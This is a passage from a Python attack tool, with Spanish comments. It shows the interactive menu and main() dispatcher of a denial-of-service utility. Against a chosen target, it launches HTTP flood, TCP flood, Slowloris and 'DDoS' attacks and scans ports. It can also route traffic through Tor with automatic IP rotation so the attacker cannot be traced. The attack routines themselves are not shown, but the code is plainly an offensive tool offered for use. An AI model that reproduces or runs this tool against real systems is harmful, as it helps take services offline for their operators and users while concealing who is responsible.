            port = int(input(f"{t.get('target_port')}: "))
            num_conn = int(input(f"{t.get('num_connections')}: "))
            message = input(f"{t.get('message')}: ")
            tcp_flood(target, port, num_conn, message)

        elif choice == '4':
            num_sockets = int(input(f"{t.get('num_sockets')}: ") or 150)
            slowloris_attack(target, num_sockets)

        elif choice == '5':
            duration = int(input(f"{t.get('duration')}: ") or 60)
            ddos_attack(target, duration)

        else:
            print(t.get('error_invalid_option'))

    except KeyboardInterrupt:
        print(f"\n{t.get('operation_cancelled')}")
    except Exception as e:
        print(f"{t.get('error_general')}: {e}")

    # Preguntar si desea reiniciar
    answer = input(f"\n{t.get('restart')}: ").strip().lower()
    if answer in ['s', 'si', 'y', 'yes']:
        restart_program()
    else:
        print(t.get('exiting'))

def main():
    """Función principal."""
    args = parse_arguments()
    
    # Configurar idioma
    Config.LANGUAGE = 'spanish' if args.language == 'es' else 'english'
    
    # Configurar Tor si está habilitado
    Config.USE_TOR = args.tor
    Config.TOR_ROTATION_INTERVAL = args.tor_rotation
    
    # Inicializar Tor si está habilitado
    tor_controller = None
    if Config.USE_TOR:
        tor_controller = TorController()
        try:
            with tor_controller as controller:
                if controller:
                    ip = controller.get_current_ip()
                    if ip:
                        print(f"[+] Usando Tor. IP actual: {ip}")
                        
                        # Iniciar rotación automática de IP si está habilitada
                        if Config.TOR_ROTATION_INTERVAL > 0:
                            def rotate_ip_periodically():
                                while True:
                                    time.sleep(Config.TOR_ROTATION_INTERVAL)
                                    with TorController() as tc:
                                        if tc:
                                            tc.new_identity()
                            
                            rotation_thread = threading.Thread(
                                target=rotate_ip_periodically,
                                daemon=True
                            )
                            rotation_thread.start()
                            print(f"[+] Rotación automática de IP cada {Config.TOR_ROTATION_INTERVAL} segundos")
                    else:
                        print("[-] No se pudo obtener la IP de Tor")
                else:
                    print("[-] No se pudo conectar al control de Tor")
        except Exception as e:
            print(f"[-] Error al conectar con Tor: {e}")
    
    # Si no hay argumentos o no se especificó un comando, entrar en modo interactivo
    if not args.command and not args.target:
        return interactive_mode()
    
    # Verificar que se haya proporcionado un objetivo
    if not args.target:
        print("Error: Se requiere un objetivo. Use --help para ayuda.")
        return
    
    try:
        # Ejecutar el comando correspondiente
        if args.command == 'scan':
            open_ports = port_scan(args.target, args.start_port, args.end_port)
            print(f"\n[+] Escaneo completado. Puertos abiertos: {open_ports}")
            
        elif args.command == 'http':
            print(f"[+] Iniciando HTTP Flood a {args.target} con {args.requests} requests...")
            http_flood(args.target, args.requests, args.delay)
            
        elif args.command == 'tcp':
            print(f"[+] Iniciando TCP Flood a {args.target}:{args.port} con {args.connections} conexiones...")
            tcp_flood(args.target, args.port, args.connections, args.message)
            
        elif args.command == 'slowloris':
            print(f"[+] Iniciando ataque Slowloris a {args.target} con {args.sockets} sockets...")
            slowloris_attack(args.target, args.sockets)
            
        elif args.command == 'ddos':
            print(f"[+] Iniciando ataque DDoS a {args.target} por {args.duration} segundos...")
            ddos_attack(args.target, args.duration)
            
        else:
            print("Comando no reconocido. Use --help para ver la ayuda.")
            
    except KeyboardInterrupt:
        print("\n[!] Operación cancelada por el usuario")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Aplicación terminada por el usuario")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error crítico: {e}")
        sys.exit(1)
